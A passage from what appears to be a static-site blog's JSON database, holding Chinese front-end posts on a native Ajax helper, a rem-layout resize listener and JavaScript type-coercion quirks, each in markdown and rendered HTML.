\"application/x-www-form-urlencoded\");\n        xhr.send(params);\n      }\n    }\n    \n    //格式化参数\n    function formatParams(data) {\n      var arr = [];\n      for (var name in data) {\n        arr.push(encodeURIComponent(name) + \"=\" + encodeURIComponent(data[name]));\n      }\n      arr.push((\"v=\" + Math.random()).replace(\".\", \"\"));\n      // console.log(arr.join(\"&\"));\n      return arr.join(\"&\");\n    }\n````","slug":"FrontEnd/JS/原生Ajax请求","published":1,"updated":"2018-05-05T02:36:05.666Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2cr0072b8xjcx9l753d","content":"<h1 id=\"原生Ajax请求\"><a href=\"#原生Ajax请求\" class=\"headerlink\" title=\"原生Ajax请求\"></a>原生Ajax请求</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function ajax(options) &#123;</span><br><span class=\"line\">  options = options || &#123;&#125;;</span><br><span class=\"line\">  options.type = (options.type || &quot;GET&quot;).toUpperCase();</span><br><span class=\"line\">  options.dataType = options.dataType || &quot;json&quot;;</span><br><span class=\"line\">  var params = formatParams(options.data);</span><br><span class=\"line\"></span><br><span class=\"line\">  //创建 - 非IE6 - 第一步</span><br><span class=\"line\">  if (window.XMLHttpRequest) &#123;</span><br><span class=\"line\">    var xhr = new XMLHttpRequest();</span><br><span class=\"line\">  &#125; else &#123; //IE6及其以下版本浏览器</span><br><span class=\"line\">    var xhr = new ActiveXObject(&apos;Microsoft.XMLHTTP&apos;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //接收 - 第三步</span><br><span class=\"line\">  xhr.onreadystatechange = function () &#123;</span><br><span class=\"line\">    if (xhr.readyState == 4) &#123;</span><br><span class=\"line\">      var status = xhr.status;</span><br><span class=\"line\">      if (status &gt;= 200 &amp;&amp; status &lt; 300) &#123;</span><br><span class=\"line\">        options.success &amp;&amp; options.success(xhr.responseText, xhr.responseXML);</span><br><span class=\"line\">      &#125; else &#123;</span><br><span class=\"line\">        options.fail &amp;&amp; options.fail(status);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //连接 和 发送 - 第二步</span><br><span class=\"line\">  if (options.type == &quot;GET&quot;) &#123;</span><br><span class=\"line\">    xhr.open(&quot;GET&quot;, options.url + &quot;?&quot; + params, true);</span><br><span class=\"line\">    xhr.send(null);</span><br><span class=\"line\">  &#125; else if (options.type == &quot;POST&quot;) &#123;</span><br><span class=\"line\">    xhr.open(&quot;POST&quot;, options.url, true);</span><br><span class=\"line\">    //设置表单提交时的内容类型</span><br><span class=\"line\">    xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);</span><br><span class=\"line\">    xhr.send(params);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//格式化参数</span><br><span class=\"line\">function formatParams(data) &#123;</span><br><span class=\"line\">  var arr = [];</span><br><span class=\"line\">  for (var name in data) &#123;</span><br><span class=\"line\">    arr.push(encodeURIComponent(name) + &quot;=&quot; + encodeURIComponent(data[name]));</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  arr.push((&quot;v=&quot; + Math.random()).replace(&quot;.&quot;, &quot;&quot;));</span><br><span class=\"line\">  // console.log(arr.join(&quot;&amp;&quot;));</span><br><span class=\"line\">  return arr.join(&quot;&amp;&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"原生Ajax请求\"><a href=\"#原生Ajax请求\" class=\"headerlink\" title=\"原生Ajax请求\"></a>原生Ajax请求</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function ajax(options) &#123;</span><br><span class=\"line\">  options = options || &#123;&#125;;</span><br><span class=\"line\">  options.type = (options.type || &quot;GET&quot;).toUpperCase();</span><br><span class=\"line\">  options.dataType = options.dataType || &quot;json&quot;;</span><br><span class=\"line\">  var params = formatParams(options.data);</span><br><span class=\"line\"></span><br><span class=\"line\">  //创建 - 非IE6 - 第一步</span><br><span class=\"line\">  if (window.XMLHttpRequest) &#123;</span><br><span class=\"line\">    var xhr = new XMLHttpRequest();</span><br><span class=\"line\">  &#125; else &#123; //IE6及其以下版本浏览器</span><br><span class=\"line\">    var xhr = new ActiveXObject(&apos;Microsoft.XMLHTTP&apos;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //接收 - 第三步</span><br><span class=\"line\">  xhr.onreadystatechange = function () &#123;</span><br><span class=\"line\">    if (xhr.readyState == 4) &#123;</span><br><span class=\"line\">      var status = xhr.status;</span><br><span class=\"line\">      if (status &gt;= 200 &amp;&amp; status &lt; 300) &#123;</span><br><span class=\"line\">        options.success &amp;&amp; options.success(xhr.responseText, xhr.responseXML);</span><br><span class=\"line\">      &#125; else &#123;</span><br><span class=\"line\">        options.fail &amp;&amp; options.fail(status);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //连接 和 发送 - 第二步</span><br><span class=\"line\">  if (options.type == &quot;GET&quot;) &#123;</span><br><span class=\"line\">    xhr.open(&quot;GET&quot;, options.url + &quot;?&quot; + params, true);</span><br><span class=\"line\">    xhr.send(null);</span><br><span class=\"line\">  &#125; else if (options.type == &quot;POST&quot;) &#123;</span><br><span class=\"line\">    xhr.open(&quot;POST&quot;, options.url, true);</span><br><span class=\"line\">    //设置表单提交时的内容类型</span><br><span class=\"line\">    xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);</span><br><span class=\"line\">    xhr.send(params);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//格式化参数</span><br><span class=\"line\">function formatParams(data) &#123;</span><br><span class=\"line\">  var arr = [];</span><br><span class=\"line\">  for (var name in data) &#123;</span><br><span class=\"line\">    arr.push(encodeURIComponent(name) + &quot;=&quot; + encodeURIComponent(data[name]));</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  arr.push((&quot;v=&quot; + Math.random()).replace(&quot;.&quot;, &quot;&quot;));</span><br><span class=\"line\">  // console.log(arr.join(&quot;&amp;&quot;));</span><br><span class=\"line\">  return arr.join(&quot;&amp;&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"响应式布局JS事件","date":"2018-04-19T01:23:15.000Z","archives":"样式表","_content":"为解决屏幕分辨率问题，采用事件监听，动态修改 根节点 fontsize \n````\n// getSize(解决rem布局)\n(function(){\n\tgetSize();\n\twindow.addEventListener('resize',getSize);\n\t\n\tfunction getSize(){\n\t\tdocument.documentElement.style.fontSize \n\t\t= document.documentElement.clientWidth/3.75/2+'px';\n\t}\n})()\n````","source":"_posts/FrontEnd/JS/响应式布局JS事件.md","raw":"---\ntitle: 响应式布局JS事件\ndate: 2018-04-19 09:23:15\ntags: 响应式 getSize\narchives: 样式表\ncategories: JS\n---\n为解决屏幕分辨率问题，采用事件监听，动态修改 根节点 fontsize \n````\n// getSize(解决rem布局)\n(function(){\n\tgetSize();\n\twindow.addEventListener('resize',getSize);\n\t\n\tfunction getSize(){\n\t\tdocument.documentElement.style.fontSize \n\t\t= document.documentElement.clientWidth/3.75/2+'px';\n\t}\n})()\n````","slug":"FrontEnd/JS/响应式布局JS事件","published":1,"updated":"2018-05-09T06:35:20.849Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2cs0073b8xjn9vjicdg","content":"<p>为解决屏幕分辨率问题，采用事件监听，动态修改 根节点 fontsize<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// getSize(解决rem布局)</span><br><span class=\"line\">(function()&#123;</span><br><span class=\"line\">\tgetSize();</span><br><span class=\"line\">\twindow.addEventListener(&apos;resize&apos;,getSize);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tfunction getSize()&#123;</span><br><span class=\"line\">\t\tdocument.documentElement.style.fontSize </span><br><span class=\"line\">\t\t= document.documentElement.clientWidth/3.75/2+&apos;px&apos;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;)()</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<p>为解决屏幕分辨率问题，采用事件监听，动态修改 根节点 fontsize<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// getSize(解决rem布局)</span><br><span class=\"line\">(function()&#123;</span><br><span class=\"line\">\tgetSize();</span><br><span class=\"line\">\twindow.addEventListener(&apos;resize&apos;,getSize);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tfunction getSize()&#123;</span><br><span class=\"line\">\t\tdocument.documentElement.style.fontSize </span><br><span class=\"line\">\t\t= document.documentElement.clientWidth/3.75/2+&apos;px&apos;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;)()</span><br></pre></td></tr></table></figure></p>\n"},{"title":"怪异的JS系列","date":"2018-05-05T09:50:36.000Z","archives":"JS特殊情况","_content":"# [怪异的JavaScript系列(一)](https://juejin.im/post/5ade89db6fb9a07aab297b15)\n## [ ]等于![ ]\n    [] == ![] // -> true\n\n**相等(==)判断操作会将两边的类型都转换为数字(number)，然后再比较。**\n\n因为`[]`和`![]`都会转换为`0`。我们可以理解`[]`是一个`数组`，只不过`为空`而已，那么为`true`。右侧`![]`则为`false`。`false`然后转换为数字`0`。`左侧[]`直接`转`换为`数字`，因为`空数组`会转换`为0`，所以尽管我们认为[]为true，这里却变成了0。\n简算过程:\n````\n+[] == +![]\n0 == +false\n0 == 0\ntrue\n````\n\n## true 是 false\n    !!'false' ==  !!'true'  // -> true\n    !!'false' === !!'true' // -> true\n\n**true是一个真值，用1表示；`字符串的“true”则为NaN`。**\n\n    true == 'true'    // -> false\n    false == 'false'  // -> false\n\n**'false'是一个有意义的字符串。**\n\n## baNaNa\n    'b' + 'a' ++ 'a' + 'a' // -> baNaNa\n\n**这是一个旧笑话，不过改进过的。原始的长这样：**\n\n    'foo' ++ 'bar' // -> 'fooNaN'\n\n该表达式以`'foo' + (+'bar')`的形式计算，因为`bar不是数字`，所以转换为`NaN`。    \n\n## NaN不等于NaN\n    NaN === NaN // -> false\n\n根据 === 的算法，我们可以容易理解为什么为false。\n\n## fail\n    (![]+[])[+[]]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]] // -> fail\n\n如果我们仔细观察序列的规律，会发现下面的模式出现很多次：\n\n    (![]+[]) // -> 'false'\n    ![]      // -> false    \n\n因此，我们尝试将`[]`和`false`相加。但是根据内部一些列函数的计算(binary + Operator -> ToPrimitive -> [[DefaultValue]])，右侧的[]最终转换为string：\n\n    (![]+[].toString()) // 'false'\n\n对于一个字符串，我们就可以通过下标来获取对应的字符：\n    \n    'false'[0] // -> 'f'        \n\n剩下的都很直观，除了`i`很取巧。`fail`中的`i`是通过在`falseundefined`中获取第十个下标对应的字符而得到。    \n\n## [ ]包含值，但不是true\n\n## null不等于false\n\n## `document.all`是一个对象，不过是 undefined\n**⚠️这个是前端浏览器API，在Nodejs环境无法使用。**\n\n尽管`document.all`可以返回一个像`数组一样的对象`，可以用来`访问DOM节点`。但是呢，通过`typeof`查看`document.all`，你会惊讶地发现类型是`undefined`。\n\n    document.all instanceof Object // -> true\n    typeof document.all // -> 'undefined'\n\n而且，`document.all`并不等于`undefined`。\n\n    document.all === undefined // -> false\n    document.all === null // -> false\n\n而且，更惊讶的是：\n\n    document.all == null // -> true\n\n`document.all`是一个过去常用的`获取DOM元素`的方法，特别是老版本的IE。但是`从未进入标准`，尽管广泛使用在过去的JS代码中。当`新的API`突出来(比如`document.getElementById`)后，`document.all`就被`淘汰`了。标准委员会不知道怎么处理它。可是因为它已经被广泛使用，所以委员会觉得保留它，但是违背了`JavaScript`的规范。\n\n## 最小值比0还大\n`Number.MIN_VALUE`是最小的数，但是它比`0`还大。\n    \n    Number.MIN_VALUE > 0 // -> true\n\n因为`Number.MIN_VALUE`是`5e-324`。也就是说即使`最小的值`也可以用`浮点数`表示出来，虽然`离0很接近`，但是`依然比0大`。其实最小的数是`Number.NEGATIVE_INFINITY`，尽管它`不是一个实际存在`的数。\n","source":"_posts/FrontEnd/JS/怪异的JS.md","raw":"---\ntitle: 怪异的JS系列\ndate: 2018-05-05 17:50:36\ntags: JS特殊情况判断\narchives: JS特殊情况\ncategories: JS\n---\n# [怪异的JavaScript系列(一)](https://juejin.im/post/5ade89db6fb9a07aab297b15)\n## [ ]等于![ ]\n    [] == ![] // -> true\n\n**相等(==)判断操作会将两边的类型都转换为数字(number)，然后再比较。**\n\n因为`[]`和`![]`都会转换为`0`。我们可以理解`[]`是一个`数组`，只不过`为空`而已，那么为`true`。右侧`![]`则为`false`。`false`然后转换为数字`0`。`左侧[]`直接`转`换为`数字`，因为`空数组`会转换`为0`，所以尽管我们认为[]为true，这里却变成了0。\n简算过程:\n````\n+[] == +![]\n0 == +false\n0 == 0\ntrue\n````\n\n## true 是 false\n    !!'false' ==  !!'true'  // -> true\n    !!'false' === !!'true' // -> true\n\n**true是一个真值，用1表示；`字符串的“true”则为NaN`。**\n\n    true == 'true'    // -> false\n    false == 'false'  // -> false\n\n**'false'是一个有意义的字符串。**\n\n## baNaNa\n    'b' + 'a' ++ 'a' + 'a' // -> baNaNa\n\n**这是一个旧笑话，不过改进过的。原始的长这样：**\n\n    'foo' ++ 'bar' // -> 'fooNaN'\n\n该表达式以`'foo' + (+'bar')`的形式计算，因为`bar不是数字`，所以转换为`NaN`。    \n\n## NaN不等于NaN\n    NaN === NaN // -> false\n\n根据 === 的算法，我们可以容易理解为什么为false。\n\n## fail\n    (![]+[])[+[]]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]] // -> fail\n\n如果我们仔细观察序列的规律，会发现下面的模式出现很多次：\n\n    (![]+[]) // -> 'false'\n    ![]      // -> false    \n\n因此，我们尝试将`[]`和`false`相加。但是根据内部一些列函数的计算(binary + Operator -> ToPrimitive -> [[DefaultValue]])，右侧的[]最终转换为string：\n\n    (![]+[].toString()) // 'false'\n\n对于一个字符串，我们就可以通过下标来获取对应的字符：\n    \n    'false'[0] // -> 'f'        \n\n剩下的都很直观，除了`i`很取巧。`fail`中的`i`是通过在`falseundefined`中获取第十个下标对应的字符而得到。    \n\n## [ ]包含值，但不是true\n\n## null不等于false\n\n## `document.all`是一个对象，不过是 undefined\n**⚠️这个是前端浏览器API，在Nodejs环境无法使用。**\n\n尽管`document.all`可以返回一个像`数组一样的对象`，可以用来`访问DOM节点`。但是呢，通过`typeof`查看`document.all`，你会惊讶地发现类型是`undefined`。\n\n    document.all instanceof Object // -> true\n    typeof document.all // -> 'undefined'\n\n而且，`document.all`并不等于`undefined`。\n\n    document.all === undefined // -> false\n    document.all === null // -> false\n\n而且，更惊讶的是：\n\n    document.all == null // -> true\n\n`document.all`是一个过去常用的`获取DOM元素`的方法，特别是老版本的IE。但是`从未进入标准`，尽管广泛使用在过去的JS代码中。当`新的API`突出来(比如`document.getElementById`)后，`document.all`就被`淘汰`了。标准委员会不知道怎么处理它。可是因为它已经被广泛使用，所以委员会觉得保留它，但是违背了`JavaScript`的规范。\n\n## 最小值比0还大\n`Number.MIN_VALUE`是最小的数，但是它比`0`还大。\n    \n    Number.MIN_VALUE > 0 // -> true\n\n因为`Number.MIN_VALUE`是`5e-324`。也就是说即使`最小的值`也可以用`浮点数`表示出来，虽然`离0很接近`，但是`依然比0大`。其实最小的数是`Number.NEGATIVE_INFINITY`，尽管它`不是一个实际存在`的数。\n","slug":"FrontEnd/JS/怪异的JS","published":1,"updated":"2018-05-11T01:20:59.078Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i2ct0078b8xj20fuio4x","content":"<h1 id=\"怪异的JavaScript系列-一\"><a href=\"#怪异的JavaScript系列-一\" class=\"headerlink\" title=\"怪异的JavaScript系列(一)\"></a><a href=\"https://juejin.im/post/5ade89db6fb9a07aab297b15\" target=\"_blank\" rel=\"noopener\">怪异的JavaScript系列(一)</a></h1><h2 id=\"等于\"><a href=\"#等于\" class=\"headerlink\" title=\"[ ]等于![ ]\"></a>[ ]等于![ ]</h2><pre><code>[] == ![] // -&gt; true\n</code></pre><p><strong>相等(==)判断操作会将两边的类型都转换为数字(number)，然后再比较。</strong></p>\n<p>因为<code>[]</code>和<code>![]</code>都会转换为<code>0</code>。我们可以理解<code>[]</code>是一个<code>数组</code>，只不过<code>为空</code>而已，那么为<code>true</code>。右侧<code>![]</code>则为<code>false</code>。<code>false</code>然后转换为数字<code>0</code>。<code>左侧[]</code>直接<code>转</code>换为<code>数字</code>，因为<code>空数组</code>会转换<code>为0</code>，所以尽管我们认为[]为true，这里却变成了0。<br>简算过程:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+[] == +![]</span><br><span class=\"line\">0 == +false</span><br><span class=\"line\">0 == 0</span><br><span class=\"line\">true</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"true-是-false\"><a href=\"#true-是-false\" class=\"headerlink\" title=\"true 是 false\"></a>true 是 false</h2><pre><code>!!&apos;false&apos; ==  !!&apos;true&apos;  // -&gt; true\n!!&apos;false&apos; === !!&apos;true&apos; // -&gt; true\n</code></pre><p><strong>true是一个真值，用1表示；<code>字符串的“true”则为NaN</code>。</strong></p>\n<pre><code>true == &apos;true&apos;    // -&gt; false\nfalse == &apos;false&apos;  // -&gt; false\n</code></pre><p><strong>‘false’是一个有意义的字符串。</strong></p>\n<h2 id=\"baNaNa\"><a href=\"#baNaNa\" class=\"headerlink\" title=\"baNaNa\"></a>baNaNa</h2><pre><code>&apos;b&apos; + &apos;a&apos; ++ &apos;a&apos; + &apos;a&apos; // -&gt; baNaNa\n</code></pre><p><strong>这是一个旧笑话，不过改进过的。原始的长这样：</strong></p>\n<pre><code>&apos;foo&apos; ++ &apos;bar&apos; // -&gt; &apos;fooNaN&apos;\n</code></pre><p>该表达式以<code>&#39;foo&#39; + (+&#39;bar&#39;)</code>的形式计算，因为<code>bar不是数字</code>，所以转换为<code>NaN</code>。    </p>\n<h2 id=\"NaN不等于NaN\"><a href=\"#NaN不等于NaN\" class=\"headerlink\" title=\"NaN不等于NaN\"></a>NaN不等于NaN</h2><pre><code>NaN === NaN // -&gt; false\n</code></pre><p>根据 === 的算法，我们可以容易理解为什么为false。</p>\n<h2 id=\"fail\"><a href=\"#fail\" class=\"headerlink\" title=\"fail\"></a>fail</h2><pre><code>(![]+[])[+[]]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]] // -&gt; fail\n</code></pre><p>如果我们仔细观察序列的规律，会发现下面的模式出现很多次：</p>\n<pre><code>(![]+[]) // -&gt; &apos;false&apos;\n![]      // -&gt; false    \n</code></pre><p>因此，我们尝试将<code>[]</code>和<code>false</code>相加。但是根据内部一些列函数的计算(binary + Operator -&gt; ToPrimitive -&gt; [[DefaultValue]])，右侧的[]最终转换为string：</p>\n<pre><code>(![]+[].toString()) // &apos;false&apos;\n</code></pre><p>对于一个字符串，我们就可以通过下标来获取对应的字符：</p>\n<pre><code>&apos;false&apos;[0] // -&gt; &apos;f&apos;        \n</code></pre><p>剩下的都很直观，除了<code>i</code>很取巧。<code>fail</code>中的<code>i</code>是通过在<code>falseundefined</code>中获取第十个下标对应的字符而得到。    </p>\n<h2 id=\"包含值，但不是true\"><a href=\"#包含值，但不是true\" class=\"headerlink\" title=\"[ ]包含值，但不是true\"></a>[ ]包含值，但不是true</h2><h2 id=\"null不等于false\"><a href=\"#null不等于false\" class=\"headerlink\" title=\"null不等于false\"></a>null不等于false</h2><h2 id=\"document-all是一个对象，不过是-undefined\"><a href=\"#document-all是一个对象，不过是-undefined\" class=\"headerlink\" title=\"document.all是一个对象，不过是 undefined\"></a><code>document.all</code>是一个对象，不过是 undefined</h2><p><strong>⚠️这个是前端浏览器API，在Nodejs环境无法使用。</strong></p>\n<p>尽管<code>document.all</code>可以返回一个像<code>数组一样的对象</code>，可以用来<code>访问DOM节点</code>。但是呢，通过<code>typeof</code>查看<code>document.all</code>，你会惊讶地发现类型是<code>undefined</code>。</p>\n<pre><code>document.all instanceof Object // -&gt; true\ntypeof document.all // -&gt; &apos;undefined&apos;\n</code></pre><p>而且，<code>document.all</code>并不等于<code>undefined</code>。</p>\n<pre><code>document.all === undefined // -&gt; false\ndocument.all === null // -&gt; false\n</code></pre><p>而且，更惊讶的是：</p>\n<pre><code>document.all == null // -&gt; true\n</code></pre><p><code>document.all</code>是一个过去常用的<code>获取DOM元素</code>的方法，特别是老版本的IE。但是<code>从未进入标准</code>，尽管广泛使用在过去的JS代码中。当<code>新的API</code>突出来(比如<code>document.getElementById</code>)后，<code>document.all</code>就被<code>淘汰</code>了。标准委员会不知道怎么处理它。可是因为它已经被广泛使用，所以委员会觉得保留它，但是违背了<code>JavaScript</code>的规范。</p>\n<h2 id=\"最小值比0还大\"><a href=\"#最小值比0还大\" class=\"headerlink\" title=\"最小值比0还大\"></a>最小值比0还大</h2><p><code>Number.MIN_VALUE</code>是最小的数，但是它比<code>0</code>还大。</p>\n<pre><code>Number.MIN_VALUE &gt; 0 // -&gt; true\n</code></pre><p>因为<code>Number.MIN_VALUE</code>是<code>5e-324</code>。也就是说即使<code>最小的值</code>也可以用<code>浮点数</code>表示出来，虽然<code>离0很接近</code>，但是<code>依然比0大</code>。其实最小的数是<code>Number.NEGATIVE_INFINITY</code>，尽管它<code>不是一个实际存在</code>的数。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"怪异的JavaScript系列-一\"><a href=\"#怪异的JavaScript系列-一\" class=\"headerlink\" title=\"怪异的JavaScript系列(一)\"></a><a href=\"https://juejin.im/post/5ade89db6fb9a07aab297b15\" target=\"_blank\" rel=\"noopener\">怪异的JavaScript系列(一)</a></h1><h2 id=\"等于\"><a href=\"#等于\" class=\"headerlink\" title=\"[ ]等于![ ]\"></a>[ ]等于![ ]</h2><pre><code>[] == ![] // -&gt; true\n</code></pre><p><strong>相等(==)判断操作会将两边的类型都转换为数字(number)，然后再比较。</strong></p>\n<p>因为<code>[]</code>和<code>![]</code>都会转换为<code>0</code>。我们可以理解<code>[]</code>是一个<code>数组</code>，只不过<code>为空</code>而已，那么为<code>true</code>。右侧<code>![]</code>则为<code>false</code>。<code>false</code>然后转换为数字<code>0</code>。<code>左侧[]</code>直接<code>转</code>换为<code>数字</code>，因为<code>空数组</code>会转换<code>为0</code>，所以尽管我们认为[]为true，这里却变成了0。<br>简算过程:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+[] == +![]</span><br><span class=\"line\">0 == +false</span><br><span class=\"line\">0 == 0</span><br><span class=\"line\">true</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"true-是-false\"><a href=\"#true-是-false\" class=\"headerlink\" title=\"true 是 false\"></a>true 是 false</h2><pre><code>!!&apos;false&apos; ==  !!&apos;true&apos;  // -&gt; true\n!!&apos;false&apos; === !!&apos;true&apos; // -&gt; true\n</code></pre><p><strong>true是一个真值，用1表示；<code>字符串的“true”则为NaN</code>。</strong></p>\n<pre><code>true == &apos;true&apos;    // -&gt; false\nfalse == &apos;false&apos;  // -&gt; false\n</code></pre><p><strong>‘false’是一个有意义的字符串。</strong></p>\n<h2 id=\"baNaNa\"><a href=\"#baNaNa\" class=\"headerlink\" title=\"baNaNa\"></a>baNaNa</h2><pre><code>&apos;b&apos; + &apos;a&apos; ++ &apos;a&apos; + &apos;a&apos; // -&gt; baNaNa\n</code></pre><p><strong>这是一个旧笑话，不过改进过的。原始的长这样：</strong></p>\n<pre><code>&apos;foo&apos; ++ &apos;bar&apos; // -&gt; &apos;fooNaN&apos;\n</code></pre><p>该表达式以<code>&#39;foo&#39; + (+&#39;bar&#39;)</code>的形式计算，因为<code>bar不是数字</code>，所以转换为<code>NaN</code>。    </p>\n<h2 id=\"NaN不等于NaN\"><a href=\"#NaN不等于NaN\" class=\"headerlink\" title=\"NaN不等于NaN\"></a>NaN不等于NaN</h2><pre><code>NaN === NaN // -&gt; false\n</code></pre><p>根据 === 的算法，我们可以容易理解为什么为false。</p>\n<h2 id=\"fail\"><a href=\"#fail\" class=\"headerlink\" title=\"fail\"></a>fail</h2><pre><code>(![]+[])[+[]]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]] // -&gt; fail\n</code></pre><p>如果我们仔细观察序列的规律，会发现下面的模式出现很多次：</p>\n<pre><code>(![]+[]) // -&gt; &apos;false&apos;\n![]      // -&gt; false    \n</code></pre><p>因此，我们尝试将<code>[]</code>和<code>false</code>相加。但是根据内部一些列函数的计算(binary + Operator -&gt; ToPrimitive -&gt; [[DefaultValue]])，右侧的[]最终转换为string：</p>\n<pre><code>(![]+[].toString()) // &apos;false&apos;\n</code></pre><p>对于一个字符串，我们就可以通过下标来获取对应的字符：</p>\n<pre><code>&apos;false&apos;[0] // -&gt; &apos;f&apos;        \n</code></pre><p>剩下的都很直观，除了<code>i</code>很取巧。<code>fail</code>中的<code>i</code>是通过在<code>falseundefined</code>中获取第十个下标对应的字符而得到。    </p>\n<h2 id=\"包含值，但不是true\"><a href=\"#包含值，但不是true\" class=\"headerlink\" title=\"[ ]包含值，但不是true\"></a>[ ]包含值，但不是true</h2><h2 id=\"null不等于false\"><a href=\"#null不等于false\" class=\"headerlink\" title=\"null不等于false\"></a>null不等于false</h2><h2 id=\"document-all是一个对象，不过是-undefined\"><a href=\"#document-all是一个对象，不过是-undefined\" class=\"headerlink\" title=\"document.all是一个对象，不过是 undefined\"></a><code>document.all</code>是一个对象，不过是 